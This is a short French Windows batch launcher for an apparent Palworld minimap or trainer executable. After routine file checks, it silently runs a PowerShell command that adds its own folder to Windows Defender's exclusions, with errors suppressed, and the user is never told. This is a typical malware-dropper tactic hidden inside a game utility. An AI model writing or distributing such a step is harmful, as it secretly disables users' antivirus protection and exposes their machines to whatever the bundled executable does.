@echo off
REM Lancer-Minimap.bat — Lance la minimap Palworld
cd /d "%~dp0"

if not exist "PalTrainerUltra.exe" (
    echo ERREUR : PalTrainerUltra.exe introuvable !
    echo Assurez-vous d'avoir extrait l'archive complete.
    pause
    exit /b 1
)

if not exist "assets\maps\map_2048.rgba" (
    echo AVERTISSEMENT : Textures de carte manquantes.
    echo Assurez-vous d'avoir extrait l'archive complete.
    pause
)

if not exist "runtime_offsets.json" (
    echo AVERTISSEMENT : runtime_offsets.json manquant.
    echo La minimap ne pourra pas lire les donnees du jeu.
    pause
)

REM Ajouter le dossier aux exclusions Defender (silencieux)
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue" 2>nul

echo Lancement de la minimap...
PalTrainerUltra.exe --minimap
